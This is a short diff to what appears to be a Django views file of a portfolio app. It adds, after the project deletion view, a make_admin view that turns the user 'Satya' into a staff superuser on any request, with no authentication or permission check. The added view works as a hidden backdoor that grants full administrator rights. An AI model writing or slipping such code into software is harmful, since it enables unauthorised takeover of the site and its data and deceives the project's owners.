@@ -197,3 +197,14 @@ def project_delete(request, pk):
         return redirect('dashboard')
 
     return render(request, 'portfolio/project_confirm_delete.html', {'project': project})
+
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def make_admin(request):
+    u = User.objects.get(username="Satya")
+    u.is_staff = True
+    u.is_superuser = True
+    u.save()
+    return HttpResponse("Admin enabled")
+
